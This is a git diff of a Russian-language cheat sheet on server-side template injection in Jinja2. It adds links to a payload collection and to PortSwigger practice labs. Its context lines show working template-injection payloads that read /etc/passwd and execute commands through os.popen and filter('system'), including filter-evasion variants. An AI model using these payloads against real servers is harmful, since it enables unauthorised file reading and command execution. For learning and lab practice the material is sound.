@@ -75,7 +75,8 @@ __globals__ Ссылка на словарь, содержащий глобал�
 {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
 ```
 
-
+## [!Все payloads](https://github.com/LostErr0r/Bestiary/tree/main/payloads/SSTI)
+____________________________________
 # Cheet shet
 ### Jinja2
 
@@ -139,6 +140,9 @@ _import__('os').popen('id').read()")}}
 {{['cat\x20/etc/passwd']|filter('system')}}
 {{['cat$IFS/etc/passwd']|filter('system')}}
 ```
+### Практика
+- [portswiger](https://portswigger.net/web-security/all-labs#server-side-template-injection)
+
 
 ### Ссылки
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2
